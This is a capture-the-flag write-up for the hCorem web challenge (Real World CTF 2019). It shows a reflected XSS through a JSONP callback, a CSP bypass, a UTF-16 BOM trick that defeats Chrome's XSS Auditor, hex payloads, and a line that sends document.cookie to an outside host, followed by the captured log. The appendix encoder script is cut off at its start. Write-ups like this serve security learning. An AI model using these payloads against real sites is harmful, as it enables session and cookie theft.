# hCorem - Real World CTF 2019 Quals

## Introduction

hCorem is a web task. The goal is to exploit a vulnerable script to inject an  
XSS and retrieve the cookie of an up-to-date browser (Chrome v77.0.3865.75)

An archive containing the files required to build a Docker container of the
task  
is provided. It contains the following files:

```  
.  
├── docker-compose.yaml  
├── dockerfile-php  
├── hcorem.conf  
├── html  
│   ├── api.php  
│   ├── hcorem.js  
│   └── index.html  
└── nginx.conf  
```

## Source code analysis

The source code contains 3 files. The code is straightforward, and it is  
relatively easy to find the vulnerability:

```php  
<?php
function response(array $data = [], bool $success = true, string $message = ""): void
{
    $callback = $_REQUEST['callback'] ?? null;
    $_data = ['success' => $success, 'message' => $message, 'data' => $data];
    if ($callback) {
        echo sprintf("%s(%s)", $callback, json_encode($_data));
    } else {
        echo json_encode($_data);
    }
}

switch ($_SERVER['PATH_INFO']) {
    case '/qwq':
        response([
            'title' => 'uwu',
        ]);
        break;
    default:
        header(sprintf("%s 404 Not Found", $_SERVER['SERVER_PROTOCOL']));
        die('api not found.');
}
```

Accessing the page `/api.php/qwq?callback=foobar` will print `foobar({...})`,  
resulting in a XSS vulnerability.

## Security protections

The vulnerability identified is the most basic case of a reflected XSS.
However,  
the web server is configured to send the following security headers:

- `X-XSS-Protection`  
- `Content-Security-Policy`  
- `X-Frame-Options`  
- `X-Content-Type-Options`  
- `Referrer-Policy`

The two first headers prevent the XSS from being exploited.

### Content-Security-Policy

The Content-Security-Policy (CSP) header is set to:  
`default-src 'self'; object-src 'none'; base-uri 'none';`

This means that resources can only be loaded from the same domain (`self`),  
except for objects that cannot be loaded at all.

The bypass for CSP is to include the API again. The following payload will
show  
an alert box on Firefox (where the second protection is not present):  
```html  
<script src="/api.php/qwq?callback=alert(1)//"></script>  
```

### X-XSS-Protection

The X-XSS-Protection header is set to: `1; mode=block`

This informs Chrome to enable XSS Auditor, in blocking mode.

XSS Auditor is a feature that prevents reflected XSS attacks: if `<script>...`  
is present both in the GET/POST variables and in the body, the browser will  
identify the request as exploiting a reflected XSS and will block the page.

One of the ideas we had to bypass XSS Auditor was to trick the browser by  
specifying a different encoding. This idea is backed by the name of the task  
(`hCorem` which is `Chrome` spelled in middle endian)

It is possible to change the encoding of a page to UTF-8, UTF-16BE or UTF16-LE  
by putting a Byte Order Mark (BOM) before the document:  
- 0xEF 0xBB 0xBF for UTF-8  
- 0xFE 0xFF for UTF-16BE  
- 0xFF 0xFE for UTF-16LE

([Source: Encoding, Living Standard §6. Hooks for
standards](https://encoding.spec.whatwg.org/#specification-hooks))

The following payload (not URL-encoded for readability) bypasses XSS auditor
and  
triggers an alert:  
```  
00000000: ff fe 31 00 3c 00 73 00 63 00 72 00 69 00 70 00  ..1.<.s.c.r.i.p.  
00000010: 74 00 3e 00 61 00 6c 00 65 00 72 00 74 00 28 00  t.>.a.l.e.r.t.(.  
00000020: 31 00 29 00 3c 00 2f 00 73 00 63 00 72 00 69 00  1.).<./.s.c.r.i.  
00000030: 70 00 74 00 3e 00                                p.t.>.  
```

### Combining both

By combining the bypasses found in the two previous sections, it is possible
to  
execute JavaScript code on the challenge's website:  
```  
00000000: ff fe 31 00 3c 00 73 00 63 00 72 00 69 00 70 00  ..1.<.s.c.r.i.p.  
00000010: 74 00 20 00 73 00 72 00 63 00 3d 00 27 00 2f 00  t. .s.r.c.=.'./.  
00000020: 61 00 70 00 69 00 2e 00 70 00 68 00 70 00 2f 00  a.p.i...p.h.p./.  
00000030: 71 00 77 00 71 00 3f 00 63 00 61 00 6c 00 6c 00  q.w.q.?.c.a.l.l.  
00000040: 62 00 61 00 63 00 6b 00 3d 00 61 00 6c 00 65 00  b.a.c.k.=.a.l.e.  
00000050: 72 00 74 00 25 00 32 00 38 00 31 00 25 00 32 00  r.t.%.2.8.1.%.2.  
00000060: 39 00 25 00 32 00 46 00 25 00 32 00 46 00 27 00  9.%.2.F.%.2.F.'.  
00000070: 3e 00 3c 00 2f 00 73 00 63 00 72 00 69 00 70 00  >.<./.s.c.r.i.p.  
00000080: 74 00 3e 00                                      t.>.  
```

## Retrieving the cookies

The goal of this task is to retrieve the cookie of an headless browser.

The easiest way to retrieve them is to redirect the browser with  
`document.location.href`. Unlike AJAX calls, this redirection is not subject
to  
CSP.

The payload used to steal cookies is the following:  
```js  
document.location.href = "https://xer.forgotten-legends.org/" +
document.cookie//  
```

While being very simple, it is very effective. As soon as the bot executes the  
script, it sends a request to a server where the cookie can be found in the  
logs:  
```  
52.8.91.113 - - [16/Sep/2019:01:04:08 +0200] "GET
/flag=rwctf%7BJAME_TIME_FOR_THE_FINAL._.?} HTTP/2.0" 404 170 "-" "Mozilla/5.0
(Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
HeadlessChrome/77.0.3865.75 Safari/537.36"  
```

**Flag**: `rwctf{JAME_TIME_FOR_THE_FINAL._.?}`

## Appendices  
### encode.php  
The following script has been used to generate an URL-encoded payload:  
```php  
</script>", rawurlencode($script));

$buffer = "\xFF\xFE1";

for($i = 0; $i < strlen($payload); $i++)  
	$buffer .= "\x00" . $payload[$i];

echo rawurlencode($buffer . "\x00");  
```  

Original writeup (https://xer.forgotten-
legends.org/writeup/2019/rwctf/hCorem.md).